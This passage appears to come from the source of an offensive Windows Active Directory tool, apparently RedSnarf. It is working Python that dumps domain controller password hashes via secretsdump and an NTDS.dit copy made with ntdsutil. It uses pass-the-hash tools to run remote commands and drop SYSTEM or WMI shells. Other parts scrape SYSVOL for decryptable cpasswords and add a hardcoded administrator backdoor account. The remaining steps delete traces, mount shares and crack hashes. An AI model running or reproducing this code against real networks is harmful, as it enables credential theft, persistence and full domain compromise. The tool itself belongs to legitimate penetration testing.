				print(colored("[+]Saving hashes to: "+outputpath+targets[0]+'/drsuapi_gethashes.txt','yellow'))
				pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
				pwdump = pwdumpmatch.match(passw)

				if pwdump:
					passw=passw[0:-3]

				response = raw_input("Do you want to extract hashes with history?: Y/(N) ")
				if response in yesanswers:
					if pwdump:
						os.system("/usr/local/bin/secretsdump.py -history -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
					else:
						os.system("/usr/local/bin/secretsdump.py -history "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')

					if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
						print(colored("[+]Found file - completed : "+outputpath+targets[0]+"/drsuapi_gethashes.txt",'green'))
					else:
						print(colored("[-]File not Found - Failed : "+outputpath+targets[0]+"/drsuapi_gethashes.txt",'red'))
				else:
					if pwdump:
						os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
					else:
						os.system("/usr/local/bin/secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')

					if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
						print(colored("[+]Found file - completed : "+outputpath+targets[0],'green'))
						hashparse(outputpath+targets[0],'/drsuapi_gethashes.txt')

						if qldap in yesanswers:

							#Make sure the domain name entered on the command line matches the dns server domain name
							#if not the ldap lookup will fail.
							detecteddnsservername=dns_server_name(user, passw, targets[0], domain_name)

							if detecteddnsservername!='error':

								if detecteddnsservername!=domain_name:
									print(colored("[!]"+targets[0]+" Command line Domain name ",'red')+domain_name+colored(" does not match detected Domain Name ",'red')+detecteddnsservername)
									response=raw_input("[-]Do you want to replace it? (y/n)")
									if response in yesanswers:
										domain_name=detecteddnsservername

							print(colored("[+]Checking LM User Account Status",'yellow'))
							userstatus(outputpath,targets[0],'lm_usernames.txt',domain_name)
							print(colored("[+]Checking NT User Account Status",'yellow'))
							userstatus(outputpath,targets[0],'nt_usernames.txt',domain_name)

						if os.path.isfile(outputpath+targets[0]+"/nt.txt"):
							response = raw_input("Do you want to starting cracking the NT hashes with John The Ripper?: Y/(N) ")
							if response in yesanswers:
								quickjtr(outputpath+targets[0]+"/nt.txt")
				sys.exit()

		except OSError:
			print(colored("[-]Something went wrong using the drsuapi method",'red'))
			logging.error("[-]Something went wrong using the drsuapi method")
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will dump hashes from DC using the NTDSutil method
if ntds_util in yesanswers or ntds_util=="d":
	#Currently undocumented function - creates a bat file which can be copied and pasted to the remote machine if the process can't be fully automated
	if ntds_util=='d':
		print(colored("[+]Writing NTDS.dit dropper to /tmp/ntds.bat",'green'))
		print(colored("[+]Copy this file via RDP to the remote machine then run it",'yellow'))
		print(colored("[+]Then copy the c:\\redsnarf folder back to this machine",'yellow'))
		pscommand="ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\redsnarf\" q q"
		fout=open('/tmp/ntds.bat','w')
		fout.write('@echo off\n')
		fout.write('cls\n')
		fout.write('echo .\n')
		fout.write('echo NTDS.DIT Backup\n')
		fout.write('echo R Davy - NCCGroup	\n')
		fout.write('echo .\n')
		fout.write('echo Full backup will be created in c:\\redsnarf \n')
		fout.write('echo .\n')
		fout.write(pscommand)
		fout.close()

		sys.exit()

	#Normal fully automated functionality starts here
	if len(targets)==1:
		try:
			checkport()

			if not os.path.isfile('/usr/local/bin/secretsdump.py'):
				print(colored("[-]No secretsdump.py",'red'))
				print(colored("[-]Clone from https://github.com/CoreSecurity/impacket.git",'yellow'))
				print(colored("[-]and run: python setup.py install",'yellow'))
				exit(1)
			else:
				print(colored("[+]Found secretsdump",'green'))
			if not os.path.isdir(outputpath+targets[0]):
				os.makedirs(outputpath+targets[0])
				print(colored("[+]Creating directory for host: "+outputpath+targets[0],'green'))
			else:
				print(colored("[+]Found directory for : "+outputpath+targets[0],'green'))
			print(colored("[+]Attempting to grab a copy of NTDS.dit using NTDSUtil",'green'))
			pscommand="ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\redsnarf\" q q"
			fout=open('/tmp/ntds.bat','w')
			fout.write('@echo off\n')
			fout.write('cls\n')
			fout.write('echo .\n')
			fout.write(pscommand)
			fout.close()
			os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put ntds.bat\' 2>/dev/null")
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C c:\\ntds.bat\" 2>/dev/null")
			os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; cd redsnarf; recurse; prompt off; mget registry; exit' 2>/dev/null")
			os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; cd redsnarf; recurse; prompt off; mget \"Active Directory\"; exit' 2>/dev/null")
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C rd /s /q c:\\redsnarf\" 2>/dev/null")
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\ntds.bat\" 2>/dev/null")
			if os.path.isfile(outputpath+targets[0]+'/registry/SYSTEM') and os.path.isfile(outputpath+targets[0]+'/Active Directory/ntds.dit'):
				print(colored("[+]Found SYSTEM and ntds.dit",'green'))
				print(colored("[+]Extracting Hash Database to "+outputpath+targets[0]+'/redsnarf ' +"be patient this may take a minute or two...",'yellow'))

				response = raw_input("Do you want to extract hashes with history?: Y/(N) ")
				if response in yesanswers:
					print(colored("[+]Gathering hash history...",'yellow'))

					os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -history -system "+outputpath+targets[0]+'/registry/SYSTEM '+ "-ntds "+outputpath+targets[0]+"/Active\ Directory/ntds.dit" +" -outputfile "+outputpath+targets[0]+"/hashhistoryhashdump.txt local")
					if os.path.isfile(outputpath+targets[0]+'/hashhistoryhashdump.txt.ntds'):
						print(colored("[+]Hashes successfully output to "+outputpath+targets[0]+'/hashhistoryhashdump.txt.ntds','green'))
					else:
						print(colored('[-]Somthing went wrong extracting hash history','red'))
				else:
					os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -system "+outputpath+targets[0]+'/registry/SYSTEM '+ "-ntds "+outputpath+targets[0]+"/Active\ Directory/ntds.dit" +" -outputfile "+outputpath+targets[0]+"/hashdump.txt local")
					if os.path.isfile(outputpath+targets[0]+'/hashdump.txt.ntds'):
						print(colored("[+]Hashes successfully output to "+outputpath+targets[0]+'/hashdump.txt.ntds','green'))
					else:
						print(colored('[-]Somthing went wrong extracting hashes','red'))

					#Parse hashes into LM and NT ready for cracking
					if os.path.isfile(outputpath+targets[0]+'/hashdump.txt.ntds'):
						print(colored("[+]Parsing gathered hashes "+outputpath+targets[0]+'/hashdump.txt.ntds','green'))
						hashparse(outputpath+targets[0],'/hashdump.txt.ntds')
						#See if we want some extra information about users.
						if qldap in yesanswers:
							#Make sure the domain name entered on the command line matches the dns server domain name
							#if not the ldap lookup will fail.
							detecteddnsservername=dns_server_name(user, passw, targets[0], domain_name)

							if detecteddnsservername!='error':

								if detecteddnsservername!=domain_name:
									print(colored("[!]"+targets[0]+" Command line Domain name ",'red')+domain_name+colored(" does not match detected Domain Name ",'red')+detecteddnsservername)
									response=raw_input("[-]Do you want to replace it? (y/n) ")
									if response in yesanswers:
										domain_name=detecteddnsservername

							print(colored("[+]Checking LM User Account Status",'yellow'))
							userstatus(outputpath,targets[0],'lm_usernames.txt',domain_name)
							print(colored("[+]Checking NT User Account Status",'yellow'))
							userstatus(outputpath,targets[0],'nt_usernames.txt',domain_name)

						if os.path.isfile(outputpath+targets[0]+"/nt.txt"):
							response = raw_input("Do you want to starting cracking the NT hashes with John The Ripper?: Y/(N) ")
							if response in yesanswers:
								quickjtr(outputpath+targets[0]+"/nt.txt")
			else:
				print(colored("[-]missing SYSTEM and ntds.dit",'red'))
			sys.exit()
		except OSError:
			print(colored("[-]Something went wrong dumping NTDS.dit",'red'))
			logging.error("[-]Something went wrong dumping NTDS.dit")
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will scrape the policies and scripts folder on a DC for anything useful
if policiesscripts_dump in yesanswers:
	if len(targets)==1:
		if user!='' and passw!='' and targets[0]!='':

			checkport()

			#Make sure the domain name is correct
			detecteddnsservername=dns_server_name(user, passw, targets[0], domain_name)

			if detecteddnsservername!='error':

				if detecteddnsservername!=domain_name:
					print(colored("[!]"+targets[0]+" Command line Domain name ",'red')+domain_name+colored(" does not match detected Domain Name ",'red')+detecteddnsservername)
					response=raw_input("[-]Do you want to replace it? (y/n) ")
					if response in yesanswers:
						domain_name=detecteddnsservername

			print(colored("[+]Attempting to download contents of Policies and Scripts from sysvol and search for administrator and password:",'yellow'))

			if not os.path.isdir(outputpath+targets[0]):
				os.makedirs(outputpath+targets[0])
				print(colored("[+]Creating directory for host: "+outputpath+targets[0],'green'))
			else:
				print(colored("[+]Found directory for : "+outputpath+targets[0],'green'))
			if os.path.isdir(outputpath+targets[0]):
				print(colored("[+]Attempting to download policies folder from /sysvol",'green'))
				os.system("/usr/bin/pth-smbclient //"+targets[0]+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; cd "+domain_name+"; recurse; prompt off; mget policies; exit' 2>/dev/null")
				print(colored("[+]Attempting to download scripts folder from /sysvol",'green'))
				os.system("/usr/bin/pth-smbclient //"+targets[0]+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; cd "+domain_name+"; recurse; prompt off; mget scripts; exit' 2>/dev/null")

				if os.path.isdir(outputpath+targets[0]+'/Policies/'):
					print(colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets[0]+'/Policies/','green'))
					os.chdir(outputpath+targets[0]+'/Policies/')
					os.system("pwd")
					os.system("grep --color='auto' -ri administrator")
					os.system("grep --color='auto' -ri password")

					print(colored("[+]Attempting to to find references for cpassword in "+outputpath+targets[0]+'/Policies/','green'))
					#Grep cpassword entries out to file
					os.system("grep --exclude=cpassword.txt -ri \"cpassword\" > cpassword.txt")
					#Check to see if cpassword file has been created
					if os.path.isfile(outputpath+targets[0]+'/Policies/cpassword.txt') and os.stat(outputpath+targets[0]+'/Policies/cpassword.txt').st_size >0:
						#If file is available parse it
						print(colored("[+]Excellent we have found cpassword in Policies... "+outputpath+targets[0]+'/Policies/','green'))
						print(colored("[+]Items containing cpassword have been output to "+outputpath+targets[0]+'/Policies/cpassword.txt','blue'))
						try:
							u = open(outputpath+targets[0]+'/Policies/cpassword.txt').read().splitlines()

							for n in u:

								#Try and filter for blank cpassword - cpassword=""
								z=n.find("cpassword")
								z=z+11
								#If cpassword isn't blank continue
								if n[z:]!="\"":
									b=n.find("cpassword")

									if b>0:
										b=b+11
										c=n.find("\"",int(b))

									if b>0 and c>0:
										d=n[int(b):int(c)]

									if len(d)>0:
										print(colored("[+]Attemping to decrypt cpassword - "+d,'yellow'))
										gppdecrypt(d)

						except IOError as e:
							print("I/O error({0}): {1}".format(e.errno, e.strerror))

				if os.path.isdir(outputpath+targets[0]+'/scripts/'):
					print(colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets[0]+'/scripts/','green'))
					os.chdir(outputpath+targets[0]+'/scripts/')
					os.system("pwd")
					#os.system("grep --color='auto' -ri net user")
					os.system("grep --exclude=netuser.txt -ri \"net user\" > netuser.txt")
					os.system("grep --color='auto' -ri administrator")
					os.system("grep --color='auto' -ri password")
					os.system("grep --color='auto' -ri pwd")
					os.system("grep --color='auto' -ri runas")

					if os.path.isfile(outputpath+targets[0]+'/scripts/netuser.txt') and os.stat(outputpath+targets[0]+'/scripts/netuser.txt').st_size >0:
							#If file is available parse it
						print(colored("[+]Excellent we have found \'net user\' in scripts... "+outputpath+targets[0]+'/scripts/','green'))
						print(colored("[+]Items containing net user have been output to "+outputpath+targets[0]+'/scripts/netuser.txt','blue'))
						print(colored("[+]Looking for Account creation in scripts.",'yellow'))
						try:
							u = open(outputpath+targets[0]+'/scripts/netuser.txt').read().splitlines()

							for n in u:
								#Check the line for net user /add which indicates an account being created
								if n.find("net user"):
									if n.find("/add"):
										print(colored(n,'red'))
						except:
							print(colored("[-]Failed to find items using the command net user",'red'))
							logging.error("[-]Failed to find items using the command net user")

				sys.exit()
		else:
			print(colored('[-]Something has gone wrong check your parameters!, Try --help for a list of parameters','red'))
			print(colored('[-]Usage - ./redsnarf.py -H 10.0.0.1 -u username -p password -P y -D domain','yellow'))
			sys.exit()
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will display high priv tasks running on a remote machine
if system_tasklist in yesanswers:
	if len(targets)==1:
		try:
			print(colored('\n[+] Getting NT AUTHORITY\SYSTEM Tasklist on '+targets[0]+'\n','yellow'))
			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd.exe /C TASKLIST /FI \"USERNAME ne NT AUTHORITY\SYSTEM\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
			print(proc.communicate()[0])
			sys.exit()
		except:
			sys.exit()
	else:
		print(colored('\n[-]It is only possible to drop a shell on a single target and not a range','red'))
		sys.exit()

#Routine will start a shell
if dropshell in yesanswers:
	allshares=[]

	if len(targets)==1:
		try:
			if passw=="":
				print(colored('\n[+] Dropping WMI Based Shell on '+targets[0]+'\n','yellow'))
				os.system("wmiexec.py "+user+"@"+targets[0]+" -no-pass 2>/dev/null")
				sys.exit()
			else:
				print(colored('[+]Enter ','green')+ colored('s','yellow')+colored(' for a Shell with System Privileges','green'))
				print(colored('[+]Enter ','green')+ colored('n','yellow')+colored(' for a Shell with Privileges of ','green')+colored(user,'yellow')+" (default)")
				print(colored('[+]Enter ','green')+ colored('w','yellow')+colored(' for a WMI based Shell','green'))
				print(colored('[+]Enter ','green')+ colored('a','yellow')+colored(' to create a new DA account with the credentials ','green')+colored('redsnarf','yellow')+colored('/','green')+colored('P@ssword1','yellow')+colored(' then Shell to this account\n','green'))
				print(colored('[+]Enter ','green')+ colored('SMB','yellow')+colored(' to connect to ','green')+colored('C$','yellow')+colored(' with SMBClient','green'))

				if os.path.isfile(outputpath+targets[0]+'/shares.txt'):
					print(colored('[+]Enter ','green')+ colored('SMBC','yellow')+colored(' to mount a share from ','green')+colored(outputpath+targets[0]+'/shares.txt','yellow')+colored(' with SMBClient','green'))

				if os.path.isfile(outputpath+targets[0]+'/shares.txt'):
					print(colored('[+]Enter ','green')+ colored('SMBL','yellow')+colored(' to mount a share from ','green')+colored(outputpath+targets[0]+'/shares.txt','yellow')+colored(' locally','green'))

				response = raw_input("\nWhat kind of shell would you like:? (q to quit) ")
				if response.upper()=="S":
					print(colored('\n[+] Dropping a SYSTEM Shell on '+targets[0]+'\n','yellow'))
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
					sys.exit()
				elif response.upper()=="N" or response=="":
					print(colored('\n[+] Dropping Shell on '+targets[0] +" with privileges of "+user+'\n','yellow'))
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
					sys.exit()
				elif response.upper()=="W":
					print(colored('\n[+] Dropping WMI Based Shell on '+targets[0]+'\n','yellow'))
					os.system("wmiexec.py "+user+":"+passw+"@"+targets[0]+" 2>/dev/null")
					sys.exit()
				elif response.upper()=="A":
					print(colored('\n[+] Dropping Shell on '+targets[0] +'\n','yellow'))
					print(colored("Adding a new account with the credentials username=",'green')+colored("redsnarf",'yellow')+colored(" password=",'green')+colored("P@ssword1",'yellow'))
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe /c net user redsnarf P@ssword1 /ADD && net localgroup Administrators redsnarf /ADD\" 2>/dev/null")
					print(colored("Dropping a shell with the account ",'green')+colored("redsnarf",'yellow')+colored(" and password ",'green')+colored("P@ssword1\n",'yellow'))
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+"redsnarf"+"%"+"P@ssword1"+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
					sys.exit()
				elif response.upper()=="SMB":
					print(colored('\n[+] Connecting to C$ with SMBClient on '+targets[0] +'\n','yellow'))
					os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" 2>/dev/null")
					sys.exit()
				elif response.upper()=="SMBC":
					print(colored('\n[+] Select a share ' +'\n','yellow'))

					u = open(outputpath+targets[0]+'/shares.txt').read().splitlines()
					for n in u:
						if "READ/" in n:
							allshares.append(n)

					allshares=list(set(allshares))

					for share in xrange(len(allshares)):
						print("["+str(share)+"]"+allshares[share])

					response = raw_input("\nEnter the number of the share you wish to connect to:? ")

					cshare=allshares[int(response)].split(",")[0]

					print(colored("Mounting ",'yellow')+cshare+colored(" with SMBClient",'yellow'))

					os.system("/usr/bin/pth-smbclient //"+targets[0]+"/"+cshare+" -W "+domain_name+" -U "+user+"%"+passw+" 2>/dev/null")

					sys.exit()
				elif response.upper()=="SMBL":
					print(colored('\n[+] Select a share ' +'\n','yellow'))

					u = open(outputpath+targets[0]+'/shares.txt').read().splitlines()
					for n in u:
						if "READ/" in n:
							allshares.append(n)

					allshares=list(set(allshares))

					for share in xrange(len(allshares)):
						print("["+str(share)+"]"+allshares[share])

					response = raw_input("\nEnter the number of the share you wish to mount locally:? ")

					cshare=allshares[int(response)].split(",")[0]

					print(colored("\n[+]Mounting ",'yellow')+cshare+colored(" to ",'yellow')+outputpath+targets[0]+"/mnt")

					if not os.path.isdir(outputpath+targets[0]+"/mnt"):
						os.makedirs(outputpath+targets[0]+"/mnt")

					#Check to see if we already have a share mounted
					for l in file('/proc/mounts'):
						if outputpath+targets[0]+"/mnt" in l:
							print(colored("[-]There is already a share already mounted to ",'yellow')+outputpath+targets[0]+"/mnt")
							print(colored("[!]"+l,'red'))
							print(colored("[?]To unmount ",'blue')+"umount "+outputpath+targets[0]+"/mnt\n")
							sys.exit()

					#Mount share
					os.system("mount -t cifs //"+targets[0]+"/"+cshare+" "+outputpath+targets[0]+"/mnt"+" -o username="+user+",password="+passw+",domain="+domain_name)
					#print("mount -t cifs //"+targets[0]+"/"+cshare+" "+outputpath+targets[0]+"/mnt"+" -o username="+user+",password="+passw+",domain="+domain_name)

					#Check to see if the share has mounted
					for l in file('/proc/mounts'):
						if outputpath+targets[0]+"/mnt" in l:
							print(colored("[+]Share mounted to ",'green')+outputpath+targets[0]+"/mnt")
							print(colored("[?]To unmount ",'blue')+"umount "+outputpath+targets[0]+"/mnt\n")

							response=raw_input("[+]Enter "+colored("1",'yellow')+ " to open mount point in a new terminal window or Enter "+colored("2",'yellow')+ " to open mount point in File Manager (q to quit):")
							print("\n\n")

							if response=="1":
								#Change current working directory
								os.chdir(outputpath+targets[0]+"/mnt")
								#Open a new command prompt window in cwdir
								os.system("x-terminal-emulator ")
							elif response=="2":
								#Open file manager in the path of the newly mounted dir
								os.system("xdg-open "+outputpath+targets[0]+"/mnt")
							elif response=="q":
								sys.exit()

					sys.exit()
				elif response.upper()=="Q":
					sys.exit()

				sys.exit()

		except:
			sys.exit()
	else:
		print(colored('\n[-]It is only possible to drop a shell on a single target and not a range','red'))
		sys.exit()

#Routine will find where a user is logged on
if ofind_user !='n':
	if "file=" in ofind_user:
		print(colored("[+]Search cached logged_on_users.txt files for users",'yellow'))
		userfilename = ofind_user[5:]
		if len(userfilename)==0:
			print(colored("[-]I think you forgot the filename...",'red'))
			sys.exit()
		else:

			if os.path.isfile(userfilename):
				print(colored("[+]Confirmed that "+userfilename+ " exists...",'green'))
			else:
				print(colored("[-]Unable to confirm that "+userfilename+" exists",'red'))
				sys.exit()

			print(colored("[+]Searching for users in file "+userfilename,'yellow'))

		for ip in targets:
			if os.path.isfile(outputpath+str(ip)+'/logged_on_users.txt'):
				usernamesfile = open(userfilename, 'r')
				for usern in usernamesfile:
					if usern.rstrip() in open(outputpath+str(ip)+'/logged_on_users.txt').read():
						print(colored("[+]Found " + usern.rstrip() + " logged in to "+str(ip),'green'))

	else:
		print(colored('\n[+]Now looking for where user '+ofind_user+' is logged in','yellow'))
		for ip in targets:
			if os.path.isfile(outputpath+str(ip)+'/logged_on_users.txt'):
				if ofind_user in open(outputpath+str(ip)+'/logged_on_users.txt').read():
					print(colored("[+]Found " + ofind_user + " logged in to "+str(ip),'green'))

	sys.exit()

#Routine will check AD description field for possible passwords
if user_desc in yesanswers:
	if len(targets)==1:
		try:
			#Check that we're running this against a DC
			checkport()

			if not os.path.isdir(outputpath+targets[0]):
				os.makedirs(outputpath+targets[0])
				print(colored("[+]Creating directory for host: "+outputpath+targets[0],'green'))
			else:
				print(colored("[+]Found directory for : "+outputpath+targets[0],'yellow'))

			print(colored("[+]Attempting to gather AD Description information using RPC",'green'))

			enumdomusers(targets[0],user,passw,outputpath+targets[0]+"/")
			getdescfield(targets[0],user,passw,outputpath+targets[0]+"/")

			sys.exit()

		except:
			sys.exit()
	else:
		print(colored('\n[-]It is only possible to use this function on a single target and not a range','red'))
		sys.exit()

#This enumerates accounts running services, we get the basics of this during normal enumeration however this function gets group memberships
if service_accounts !='n':
	if service_accounts in yesanswers:
		print(colored("\n[+]Checking for services running as users: "+targets[0]+"\n",'yellow'))
		c
		os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get users.txt\' 2>/dev/null")
		os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
		res = os.stat(outputpath+targets[0]+"/users.txt").st_size > 3
		if res==True:
			try:
				u = open(outputpath+targets[0]+"/users.txt").read().splitlines()
				for n in u:
					if n:
						print(colored("[+]Account Retrieved "+n,'yellow'))

						#Get usernames and query domain for memberships
						print(colored("[+]Attempting to get account details "+n,'green'))

						#First method net user account /domain to get account details may fail depending on what privs we have
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C net user "+n.split("\\")[1]+" /domain \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						stdout_value = proc.communicate()[0]

						#If it's succcessful print details to screen else try and get details via RPC enumeration
						if "User name" in stdout_value:
							print(stdout_value)
						else:
							print("[-]Unable to retrieve account details from DC using method, going to try using RPC \n")

							#Get Group Membership using RPC to enumerate details
							print(colored("[+]Attempting to retrieve Group Membership via RPC",'green'))

							#Get DC ip from domain name
							dcip=socket.gethostbyname(domain_name)

							#Query RPC for user details
							proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"queryuser "+n.split("\\")[1]+"\"", stdout=subprocess.PIPE,shell=True)
							stdout_value = proc.communicate()[0]

							#Cycle through output
							for line in stdout_value.splitlines():
								#If we hit a user_rid line grab info and queryusergroups
								if "user_rid" in line:
									proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"queryusergroups "+line[12:len(line)]+"\"", stdout=subprocess.PIPE,shell=True)
									stdout_value = proc.communicate()[0]
									#Cycle output
									for grid in stdout_value.splitlines():
										#If we hit group rid, grab info and querygroup to get full information
										if "group rid" in grid:
											proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"querygroup "+grid[12:17].lstrip()+"\"", stdout=subprocess.PIPE,shell=True)
											stdout_value = proc.communicate()[0]
											#This (should) print Group Memberships to screen
											print(stdout_value)

			except IOError as e:
				print("I/O error({0}): {1}".format(e.errno, e.strerror))
		else:
			print(colored("[-]No service accounts found: "+targets[0],'red'))
			logging.info("[-]No service accounts found: "+targets[0])
	else:
		#Undocumented
		#Get usernames and query domain for memberships
		print(colored("[+]Attempting to get account details ",'green')+service_accounts)

		#Get Group Membership using RPC to enumerate details
		print(colored("[+]Attempting to retrieve Group Membership via RPC",'green'))

		#Get DC ip from domain name
		dcip=socket.gethostbyname(domain_name)

		#Query RPC for user details
		proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"queryuser "+service_accounts+"\"", stdout=subprocess.PIPE,shell=True)
		stdout_value = proc.communicate()[0]

		#Cycle through output
		for line in stdout_value.splitlines():
			#If we hit a user_rid line grab info and queryusergroups
			if "user_rid" in line:
				proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"queryusergroups "+line[12:len(line)]+"\"", stdout=subprocess.PIPE,shell=True)
				stdout_value = proc.communicate()[0]
				#Cycle output
				for grid in stdout_value.splitlines():
					#If we hit group rid, grab info and querygroup to get full information
					if "group rid" in grid:
						proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"querygroup "+grid[12:17].lstrip()+"\"", stdout=subprocess.PIPE,shell=True)
						stdout_value = proc.communicate()[0]
						#This (should) print Group Memberships to screen
						print(stdout_value)

	sys.exit()

if targets is None:
	print(colored('[-]You have not entered a target!, Try --help for a list of parameters','red'))
	sys.exit()

syschecks()

if __name__ == '__main__':
	signal.signal(signal.SIGINT, signal_handler)
	main()
	now = time.strftime("%c")

	print(colored("[+]Scan Stop " + time.strftime("%c"),'blue'))
	print(colored("[+]end - check redsnarf.log for log related information",'green'))
	logging.info("[+]end")
